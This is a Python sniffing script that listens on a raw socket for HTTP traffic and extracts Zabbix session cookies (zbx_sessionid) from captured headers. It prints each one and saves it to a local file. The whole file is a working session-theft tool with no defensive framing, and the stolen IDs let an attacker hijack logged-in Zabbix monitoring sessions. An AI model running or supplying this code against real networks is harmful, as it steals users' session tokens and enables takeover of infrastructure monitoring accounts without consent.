#!/usr/bin/env python3
"""
Usage: run script and wait for HTTP traffic to capture zbx_sessionid.
"""
import re
import socket

s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))

print("trying to catch zbx_sessionid")
k = ""
while True:
    data = s.recvfrom(65565)
    try:
        # s,m,k=''
        raw = data[0][54:]
        if b"HTTP" in raw:
            # print "[","="*30,']'
            if b"\r\n\r\n" in raw:
                line = raw.split(b'\r\n\r\n')[0]
                print("[*] Header Captured ")
                # print line[line.find('HTTP'):]
                value = line.decode('latin-1', errors='ignore')

                m = re.search("(zbx_sessionid.*)", value)
                if m:
                    # This is reached.
                    # print("search:", m.group(0))
                    match_value = m.group(0)
                    k = re.split(r'\W+', match_value)
                    print("session_id is :")
                    print(k[1])
                    ####Saving founded zbx_sessionid in file
                    # print (date)
                    with open('zbx_sessionids.txt', 'a', encoding='utf-8') as saved_zbxssids:
                        saved_zbxssids.write('\n')
                        # date = str(datetime.now())
                        saved_zbxssids.write(k[1]) # or with date: saved_zbxssids.write(k[1] + '   ' + date)
                        saved_zbxssids.write('\n')
                        # saved_zbxssids.write(date)
                    print("zabbix session id saved in file zbx_sessionids.txt")

                    # m = ''
                else:
                    pass
            # print raw
            else:
                # print '[{}]'.format(data)
                pass
    except KeyboardInterrupt:
        s.close()

